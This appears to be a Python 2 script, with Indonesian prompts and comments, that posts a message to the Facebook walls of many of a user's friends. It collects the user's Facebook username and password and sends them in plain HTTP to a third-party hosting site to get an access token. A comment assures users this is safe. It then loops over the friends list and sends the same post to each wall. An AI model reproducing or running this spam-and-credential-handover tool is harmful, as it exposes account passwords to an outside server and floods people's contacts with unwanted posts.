import requests
import sys
list_url = {"friends": "https://graph.facebook.com/v3.2/100007874343811/friends?access_token={}&pretty=0&limit={}",
            "kirimpesan": "https://graph.facebook.com/{}/feed?"}

def banner():
    print "SCRIPTING BY QIUBY ZHUKHI"
    print "THANKS TO dimas imam nawawi untuk web refresh Token"

def get_token():
    # Refresh token by Dimas Imam Nawawi
    #token pasti aman (y)
    print "Gunakan koma untuk memisah username dan password"
    print "Example: qiubyzhukhi,123"
    user, pwd = raw_input("Username, Password: ").split(",")
    get_token = "http://dimaslanjaka.000webhostapp.com/instagram/refreshtoken.php?user={}&pass={}".format(user,pwd)
    print "[!]GET TOKEN_FACEBOOK[!]"
    try:
        acces_token = requests.get(get_token.format(user,pwd)).json()["access_token"]
        print "[!] SUCCES [!]"
        return acces_token
    except:
        print "PLISSS LOGIN ULANG"
        sys.exit(0)
token = get_token()

def get_friends(limmit):
    temanmu = {}
    req = requests.get(list_url["friends"].format(token, limmit))
    for ids in req.json()["data"]:
        temanmu.update({ids["name"]: ids["id"]})
    return temanmu

def pesan(id, text):
    dic = {"message": text,
           "access_token": token}
    req = requests.post(list_url["kirimpesan"].format(id), data=dic).json()
    if "id" in req.keys():
        print "-- Sukses mengirim ke wall teman\n"
    else:
        print "-- Tidak bisa mengirim ke wall teman\n"

def start(text, orang):
    for nama, ids in get_friends(orang).items():
        print "[*] Mengirim Pesan Ke: " + nama
        pesan(ids, text)

if __name__ == '__main__':
    banner()
    print "Gunakan koma (,) untuk memisah pesan dan teman yang akan di kirim"
    print "CONTOH : aku ganteng,10"
    text, orang = raw_input("Tulis Pesan,orang: ").split(",")
    start(text, orang)
